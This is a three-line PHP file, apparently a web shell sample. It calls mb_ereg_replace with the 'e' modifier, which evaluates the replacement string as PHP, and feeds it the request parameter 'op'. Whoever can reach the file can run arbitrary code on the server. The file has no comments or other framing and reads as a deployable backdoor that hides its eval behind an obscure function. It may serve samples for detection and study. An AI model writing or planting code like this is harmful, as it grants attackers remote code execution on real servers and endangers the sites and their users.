<?php
  mb_ereg_replace('.*', $_REQUEST['op'], '', 'e');
?>